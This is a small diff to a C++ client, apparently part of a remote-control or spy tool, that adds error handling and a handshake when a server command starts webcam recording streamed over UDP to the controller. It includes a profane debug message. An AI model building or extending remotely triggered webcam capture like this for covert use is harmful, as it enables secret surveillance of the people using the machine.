@@ -133,10 +133,16 @@ void Client::start() {
                     } else if (command_code == WEBCAM_RECORDER) {
                         printf("[Client] Received WEBCAM_RECORDER command");
                         clspy_tunnel = new CLWebcamRecorder();
-                        rc = clspy_tunnel->init(ip_, port_ + command_arg, UDP_BASED);
+                        if (clspy_tunnel->init(ip_, port_ + command_arg, UDP_BASED) < 0 ||
+                            clspy_tunnel->udp_handshake() < 0
+                        ) {
+                            printf("[Client] Error initiating webcam_recorder\n");
+                            rc = -1;
+                        }
                     }
 
                     if (rc < 0) {
+                        printf("[Client] why the fuck it is deleting\n");
                         delete clspy_tunnel;
                         clspy_tunnel = nullptr;
                         send_out(socket_, EXEC_ERROR);
